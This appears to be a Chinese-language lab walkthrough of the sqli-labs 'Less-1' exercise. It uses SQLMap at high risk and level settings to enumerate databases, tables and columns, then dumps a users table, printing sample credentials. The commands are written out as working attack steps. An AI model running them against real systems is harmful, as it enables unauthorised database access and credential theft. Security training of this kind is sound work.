### 1. **确认数据库是否存在 SQL 注入漏洞**

首先，使用 SQLMap 检测目标 URL 是否存在 SQL 注入漏洞。运行以下命令：

```
python sqlmap.py -u "http://10.16.2.3:8081/Less-1/?id=1"  --risk=3 --level=5 --dbs
```

#### 参数说明：

> `-u "http://10.16.2.3:8081/Less-1/?id=1"`：指定目标 URL。
>
> `--risk=3`：设置 SQLMap 的风险级别为 3，表示执行更多的注入方式。
>
> `--level=5`：设置测试的详细程度为 5，表示测试更多的注入方法。
>
> `--dbs`：列出目标数据库中所有的数据库。

**输出示例**：

```
available databases [5]:
[*] challenges
[*] information_schema
[*] mysql
[*] performance_schema
[*] security
```

### 2. **列出 `security` 数据库中的所有表**

一旦你确认了目标数据库存在（比如 `security`），你可以使用 SQLMap 列出该数据库中的所有表。运行以下命令：

```
python sqlmap.py -u "http://10.16.2.3:8081/Less-1/?id=1"  --risk=3 --level=5 -D security --tables
```

#### 参数说明：

> `-D security`：指定数据库为 `security`。
>
> `--tables`：列出该数据库中的所有表。

**输出示例**：

```
Database: security
[4 tables]
+----------+
| emails   |
| referers |
| uagents  |
| users    |

```

### 3. **列出 `users` 表中的所有列**

假设你选择了 `users` 表，下一步是列出该表中的所有列。运行以下命令：

```
python sqlmap.py -u "http://10.16.2.3:8081/Less-1/?id=1"  --risk=3 --level=5 -D security -T users --columns
```

#### 参数说明：

> `-D security`：指定数据库为 `security`。
>
> `-T users`：指定表名为 `users`。
>
> `--columns`：列出 `users` 表中的所有列。

**输出示例**：

```
Table: users
[3 columns]
+----------+-------------+
| Column   | Type        |
+----------+-------------+
| id       | int(3)      |
| password | varchar(20) |
| username | varchar(20) |
+----------+-------------+
```

### 4. **导出 `users` 表中的所有数据**

最后，你可以使用 `--dump` 参数导出 `users` 表中的所有数据。运行以下命令：

```
python sqlmap.py -u "http://10.16.2.3:8081/Less-1/?id=1"  --risk=3 --level=5 -D security -T users --dump
```

#### 参数说明：

> `-D security`：指定数据库为 `security`。
>
> `-T users`：指定表名为 `users`。
>
> `--dump`：导出 `users` 表中的所有数据。

**输出示例**：

```
Database: security
Table: users
[13 entries]
+----+------------+----------+
| id | password   | username |
+----+------------+----------+
| 1  | Dumb       | Dumb     |
| 2  | I-kill-you | Angelina |
| 3  | p@ssword   | Dummy    |
| 4  | crappy     | secure   |
| 5  | stupidity  | stupid   |
| 6  | genious    | superman |
| 7  | mob!le     | batman   |
| 8  | admin      | admin    |
| 9  | admin1     | admin1   |
| 10 | admin2     | admin2   |
| 11 | admin3     | admin3   |
| 12 | dumbo      | dhakkan  |
| 14 | admin4     | admin4   |
+----+------------+----------+
```

### 总结

**执行过程：**

> **确认 SQL 注入漏洞**：使用 `--dbs` 参数列出所有数据库。
>
> **列出指定数据库的表**：使用 `-D security --tables` 来列出数据库 `security` 中的所有表。
>
> **列出表的列**：使用 `-D security -T users --columns` 来列出 `users` 表中的所有列。
>
> **导出表数据**：使用 `-D security -T users --dump` 来导出 `users` 表中的所有数据。

### 注意事项：

> 每个命令都是独立执行的，确保每一步都成功执行。
>
> `--risk` 和 `--level` 这两个参数控制 SQLMap 的攻击力度和复杂度，`--risk=3` 和 `--level=5` 是较高的设置，适合测试更多的注入方法和漏洞。